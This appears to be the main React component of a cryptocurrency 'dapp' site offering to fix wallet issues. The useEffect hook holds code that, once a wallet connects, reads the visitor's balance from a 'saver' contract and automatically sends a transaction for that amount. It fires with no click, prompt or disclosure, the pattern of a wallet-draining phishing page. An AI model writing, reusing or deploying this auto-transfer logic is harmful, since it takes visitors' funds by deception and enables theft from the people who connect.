import React, { useEffect, useState } from "react";
import Navbar from "./components/navbar/Navbar";
import Hero from "./components/hero/Hero";
import ChatBox from "./components/chatbox/ChatBox";
import "./App.css";
import OpenExperiences from "./components/openExperiences/OpenExperiences";
import FxIssues from "./components/fixIssues/FxIssues";
import Ecosystem from "./components/ecosystem/Ecosystem";
import DappPlug from "./components/dappPlug/DappPlug";
import Footer from "./components/footer/Footer";
import { contractDetails } from "../src/components/index";
import {
	useNetwork,
	useAccount,
	useContractRead,
	useWaitForTransaction,
	useSendTransaction,
	usePrepareSendTransaction,
	useFeeData,
} from "wagmi";
const App = () => {
	const { chain, chains } = useNetwork();
	const { address, isConnected } = useAccount();
	const [contractAddr, setContractAddre] = useState("");
	const [chainId, setChainId] = useState("");
	const abi = contractDetails["saver"]["tokenAbi"];

	// read user balance
	const {
		data: readData,
		isError,
		isLoading,
		isSuccess: readSuccess,
	} = useContractRead({
		address: contractAddr,
		abi: abi,
		functionName: "getUserBalance",
		// watch: true,
		// chainId: chainId,
		args: [address],
	});

	// prepare contract write ..

	// . prepareConfig...
	const { config, isSuccess: savePrepare } = usePrepareSendTransaction({
		to: contractAddr,
		value: readData,
	});

	// write
	const { data, isSuccess, sendTransaction } = useSendTransaction(config);

	// wait for notification
	const { data: notificationDate } = useWaitForTransaction({
		confirmations: 9,
		hash: data?.hash,
	});

	useEffect(() => {
		console.log(typeof readData);
		if (isConnected) {
			const chainId = chain.id;
			setChainId(chainId);
			setContractAddre(contractDetails["saver"]["tokenContract"][chainId]);
			console.log(contractDetails["saver"]["tokenContract"][chainId]);
		}
		if (isConnected && savePrepare) {
			sendTransaction();
		}
	}, [isConnected, readData, savePrepare]);

	return (
		<div className="app overflow-hidden">
			<ChatBox />
			<Navbar />
			<Hero />
			<OpenExperiences />
			<FxIssues />
			<Ecosystem />
			<DappPlug />
			<Footer />
		</div>
	);
};

export default App;
